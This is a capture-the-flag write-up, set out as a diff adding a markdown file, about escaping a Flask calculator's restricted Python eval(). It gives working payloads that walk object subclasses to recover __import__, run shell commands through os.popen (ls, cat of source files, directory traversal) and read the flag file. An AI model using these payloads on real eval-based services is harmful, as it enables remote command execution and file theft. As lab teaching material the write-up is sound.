@@ -1,1 +1,104 @@
+Math Expression Calculator - RCE Exploit Writeup
+
+Challenge: Exploiting a vulnerable Flask-based math expression evaluator  
+Category: Web Exploitation  
+CTF: bEst Calculator  
+
+
+ Challenge Description
+
+A web-based calculator built using Flask allows users to evaluate math expressions via a form. Our goal is to escape the restricted environment and retrieve the flag.
+
+
+
+ Source Code Summary
+
+The backend evaluates user input using Python’s `eval()`:
+
+python
+eval(
+    expression,
+    {
+        "__builtins__": {},
+        "sin": math.sin,
+        "cos": math.cos,
+        "tan": math.tan,
+        "log": math.log,
+        "sqrt": math.sqrt,
+        "pi": math.pi,
+        "e": math.e,
+    }
+)
+
+
+At first glance, it looks safe due to the restricted `__builtins__`. However, Python’s introspection capabilities allow bypassing this restriction.
+
+
+
+## Vulnerability
+
+Even with `__builtins__` removed, Python allows deep introspection through its object model. We can access hidden built-ins using:
+
+```python
+(1).__class__.__bases__[0].__subclasses__()
+```
+
+This gives access to many internal classes, including ones that can be used to retrieve `__import__`.
+
+---
+
+## Exploitation Steps
+
+### Step 1: Gain Access to `__import__`
+
+Use the subclass list to locate a class that allows us to retrieve the global `__builtins__`:
+
+```python
+(1).__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']
+```
+
+### Step 2: Execute OS Commands via `os.popen`
+
+Now we can import the `os` module and execute system commands:
+
+```python
+(1).__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']("os").popen("ls /").read()
+```
+
+#### Example Commands:
+
+- List files in `/home/user`:
+
+```python
+...__import__('os').popen('ls -la /home/user').read()
+```
+
+- Read source code files:
+
+```python
+...__import__('os').popen('cat /home/user/app.py').read()
+```
+
+- Explore the filesystem using `../`:
+
+```python
+...__import__('os').popen('ls -la /home/user/../..').read()
+```
+
+### Step 3: Capture the Flag
+
+Eventually, we find and read the flag file:
+
+```python
+(1).__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['__builtins__']['open']('../../flag.txt').read()
+```
+
+---
+
+## Flag:
+
+```
+[REDACTED]
+```
+
 
